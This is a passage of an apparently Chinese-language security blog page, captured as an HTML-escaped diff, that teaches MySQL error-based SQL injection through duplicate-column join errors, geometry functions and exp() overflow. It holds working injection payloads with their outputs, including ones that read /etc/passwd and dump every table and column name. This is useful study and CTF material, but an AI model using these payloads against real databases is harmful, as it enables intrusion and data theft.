+&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;ERROR&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;1060&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;42&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;S21&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;):&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;n&#34;&gt;Duplicate&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;k&#34;&gt;column&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;n&#34;&gt;name&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;5.7.17&amp;#39;&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
+&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
+&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;//&lt;/span&gt;&lt;span class=&#34;err&#34;&gt;配合&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;join获取列名&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
+&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;&lt;/span&gt;&lt;span class=&#34;k&#34;&gt;select&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;o&#34;&gt;*&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;  &lt;/span&gt;&lt;span class=&#34;k&#34;&gt;from&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;k&#34;&gt;select&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;o&#34;&gt;*&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;k&#34;&gt;from&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;n&#34;&gt;test&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;n&#34;&gt;a&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;k&#34;&gt;join&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;n&#34;&gt;test&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;n&#34;&gt;b&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;k&#34;&gt;c&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
+&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;ERROR&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;1060&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;42&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;S21&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;):&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;n&#34;&gt;Duplicate&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;k&#34;&gt;column&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;n&#34;&gt;name&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;id&amp;#39;&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
+&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;&lt;/span&gt;&lt;span class=&#34;k&#34;&gt;select&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;o&#34;&gt;*&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;  &lt;/span&gt;&lt;span class=&#34;k&#34;&gt;from&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;k&#34;&gt;select&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;o&#34;&gt;*&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;k&#34;&gt;from&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;n&#34;&gt;test&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;n&#34;&gt;a&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;k&#34;&gt;join&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;n&#34;&gt;test&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;n&#34;&gt;b&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;k&#34;&gt;using&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;id&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;))&lt;/span&gt;&lt;span class=&#34;k&#34;&gt;c&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;o&#34;&gt;//&lt;/span&gt;&lt;span class=&#34;k&#34;&gt;using&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;id&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;err&#34;&gt;等同于配合&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;join使用的on&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
+&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;ERROR&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;1060&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;42&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;S21&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;):&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;n&#34;&gt;Duplicate&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;k&#34;&gt;column&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;n&#34;&gt;name&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;name&amp;#39;&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;o&#34;&gt;//&lt;/span&gt;&lt;span class=&#34;err&#34;&gt;两个&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;test表必然每个列都重复&lt;/span&gt;&lt;span class=&#34;err&#34;&gt;，&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;using了id列之后&lt;/span&gt;&lt;span class=&#34;err&#34;&gt;，就会继续报出第二列错&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
+&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;&lt;/span&gt;&lt;span class=&#34;k&#34;&gt;select&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;o&#34;&gt;*&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;  &lt;/span&gt;&lt;span class=&#34;k&#34;&gt;from&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;k&#34;&gt;select&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;o&#34;&gt;*&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;k&#34;&gt;from&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;n&#34;&gt;test&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;n&#34;&gt;a&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;k&#34;&gt;join&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;n&#34;&gt;test&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;n&#34;&gt;b&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;k&#34;&gt;using&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;id&lt;/span&gt;&lt;span class=&#34;err&#34;&gt;，&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;name&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;))&lt;/span&gt;&lt;span class=&#34;k&#34;&gt;c&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;o&#34;&gt;//&lt;/span&gt;&lt;span class=&#34;err&#34;&gt;报第三列列名&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
+&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h4 id=&#34;几何函数&#34;&gt;几何函数&lt;/h4&gt;
+&lt;p&gt;&lt;strong&gt;原理&lt;/strong&gt;&lt;/p&gt;
+&lt;p&gt;mysql有些几何函数，例如geometrycollection()，multipoint()，polygon()，multipolygon()，linestring()，multilinestring()，这些函数对参数要求是形如(1 2,3 3,2 2 1)这样几何数据，如果不满足要求，则会报错&lt;/p&gt;
+&lt;p&gt;&lt;strong&gt;？？？？报错原理有待考究&lt;/strong&gt;&lt;/p&gt;
+&lt;p&gt;&lt;strong&gt;注意点&lt;/strong&gt;&lt;/p&gt;
+&lt;blockquote&gt;
+&lt;p&gt;在版本号为5.5.47上可以用来注入，而在5.7.17上则不行&lt;/p&gt;
+&lt;/blockquote&gt;
+&lt;p&gt;&lt;strong&gt;常见用法&lt;/strong&gt;&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-sql&#34; data-lang=&#34;sql&#34;&gt;&lt;span class=&#34;mi&#34;&gt;5&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;5&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;47&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;o&#34;&gt;//&lt;/span&gt;&lt;span class=&#34;err&#34;&gt;可行&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
+&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;1&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39; and (select multipoint((select * from (select * from (select version())a)b)))
+&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;ERROR 1367 (22007): Illegal non geometric &amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;k&#34;&gt;select&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;o&#34;&gt;`&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;b&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;`&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;`&lt;/span&gt;&lt;span class=&#34;k&#34;&gt;version&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;()&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;`&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;k&#34;&gt;from&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;p&#34;&gt;((&lt;/span&gt;&lt;span class=&#34;k&#34;&gt;select&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;5.5.47&amp;#39;&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;k&#34;&gt;AS&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;o&#34;&gt;`&lt;/span&gt;&lt;span class=&#34;k&#34;&gt;version&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;()&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;`&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;k&#34;&gt;from&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;n&#34;&gt;dual&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;o&#34;&gt;`&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;b&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;`&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;))&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39; value found during parsing
+&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;
+&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;5.7.17 //失效
+&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;1&amp;#39;&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;k&#34;&gt;and&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;k&#34;&gt;select&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;n&#34;&gt;multipoint&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;((&lt;/span&gt;&lt;span class=&#34;k&#34;&gt;select&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;o&#34;&gt;*&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;k&#34;&gt;from&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;k&#34;&gt;select&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;o&#34;&gt;*&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;k&#34;&gt;from&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;k&#34;&gt;select&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;k&#34;&gt;version&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;())&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;a&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;b&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)))&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
+&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;ERROR&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;1367&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;22007&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;):&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;n&#34;&gt;Illegal&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;n&#34;&gt;non&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;n&#34;&gt;geometric&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;(select `a`.`version()` from ((select version() AS `version()`) `a`))&amp;#39;&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;n&#34;&gt;value&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;k&#34;&gt;found&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;n&#34;&gt;during&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;n&#34;&gt;parsing&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h4 id=&#34;exp等函数&#34;&gt;exp()等函数&lt;/h4&gt;
+&lt;p&gt;&lt;strong&gt;原理&lt;/strong&gt;&lt;/p&gt;
+&lt;p&gt;MySQL 能记录的 Double 数值范围有限，一旦结果超过范围，则该函数报错。这个范围的极限是 709，当传递一个大于 709 的值时，函数 exp() 就会引起一个溢出错误；&lt;/p&gt;
+&lt;p&gt;当用 &lt;code&gt;~&lt;/code&gt; 运算符按位取反的方式得到一个最大值，该运算符可以处理一个字符串，经过其处理的字符串会变成一个很大整数其足以超过 MySQL 的 Double 数组范围，从而报错输出&lt;/p&gt;
+&lt;p&gt;&lt;strong&gt;注意点&lt;/strong&gt;&lt;/p&gt;
+&lt;blockquote&gt;
+&lt;p&gt;使用版本：MySQL5.5.5 及以上版本&lt;/p&gt;
+&lt;/blockquote&gt;
+&lt;p&gt;&lt;strong&gt;常见用法&lt;/strong&gt;&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-sql&#34; data-lang=&#34;sql&#34;&gt;&lt;span class=&#34;mi&#34;&gt;1&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39; and (select exp(~(select * from(select version())x)))
+&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;ERROR 1690 (22003): DOUBLE value is out of range in &amp;#39;&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;exp&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;~&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;((&lt;/span&gt;&lt;span class=&#34;k&#34;&gt;select&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;5.5.29&amp;#39;&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;k&#34;&gt;from&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;n&#34;&gt;dual&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)))&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;
+&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;
+&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;1&amp;#39;&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;k&#34;&gt;and&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;k&#34;&gt;select&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;n&#34;&gt;exp&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;~&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;k&#34;&gt;select&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;o&#34;&gt;*&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;k&#34;&gt;from&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;k&#34;&gt;select&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;k&#34;&gt;user&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;())&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;x&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)))&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
+&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;ERROR&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;1690&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;22003&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;):&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;n&#34;&gt;DOUBLE&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;n&#34;&gt;value&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;k&#34;&gt;is&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;k&#34;&gt;out&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;k&#34;&gt;of&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;n&#34;&gt;range&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;k&#34;&gt;in&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;exp(~((select &amp;#39;&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;root&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;@&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;localhost&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39; from dual)))&amp;#39;&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
+&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
+&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;1&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39; and (select exp(~(select * from(select database())x)))
+&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;ERROR 1690 (22003): DOUBLE value is out of range in &amp;#39;&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;exp&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;~&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;((&lt;/span&gt;&lt;span class=&#34;k&#34;&gt;select&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;ctf&amp;#39;&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;k&#34;&gt;from&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;n&#34;&gt;dual&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)))&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;
+&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;
+&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;//读取文件(13行限制)
+&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;1&amp;#39;&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;k&#34;&gt;and&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;k&#34;&gt;select&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;n&#34;&gt;exp&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;~&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;k&#34;&gt;select&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;o&#34;&gt;*&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;k&#34;&gt;from&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;k&#34;&gt;select&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;n&#34;&gt;load_file&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;/etc/passwd&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;))&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;x&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)))&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
+&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
+&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;//&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;dump当前上下文中所有的tables和columns&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;   &lt;/span&gt;&lt;span class=&#34;err&#34;&gt;注意：因为是当前上下文，所以单引号前条件得存在，正确&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
+&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;1&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39; and (select exp(~(select*from(select(concat(@:=0,(select count(*)from`information_schema`.columns where table_schema=database()and@:=concat(@,0xa,table_schema,0x3a3a,table_name,0x3a3a,column_name)),@)))x)))
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;&lt;strong&gt;CTF demo&lt;/strong&gt;&lt;/p&gt;
+&lt;p&gt;&lt;a class=&#34;link&#34; href=&#34;https://whoamianony.top/2021/05/01/CTF%E6%AF%94%E8%B5%9B%E8%AE%B0%E5%BD%95/%E5%A6%82%E4%BD%95%E4%BD%BF%E7%94%A8%20MySQL%20exp%28%29%20%E5%87%BD%E6%95%B0%E8%BF%9B%E8%A1%8C%20Sql%20%E6%B3%A8%E5%85%A5/&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
+    &gt;https://whoamianony.top/2021/05/01/CTF%E6%AF%94%E8%B5%9B%E8%AE%B0%E5%BD%95/%E5%A6%82%E4%BD%95%E4%BD%BF%E7%94%A8%20MySQL%20exp()%20%E5%87%BD%E6%95%B0%E8%BF%9B%E8%A1%8C%20Sql%20%E6%B3%A8%E5%85%A5/&lt;/a&gt;&lt;/p&gt;
+&lt;p&gt;&lt;strong&gt;注意点&lt;/strong&gt;&lt;/p&gt;
+&lt;blockquote&gt;
+&lt;p&gt;需要嵌套才能报错回显的原因(个人理解)：&lt;/p&gt;
+&lt;p&gt;mysql报错回显(几何函数、exp()等函数)一般报错返回的是列名相关，不嵌套就正常返回列名，比如&lt;/p&gt;
+&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;select version()； //其返回结果集的列名即为version()
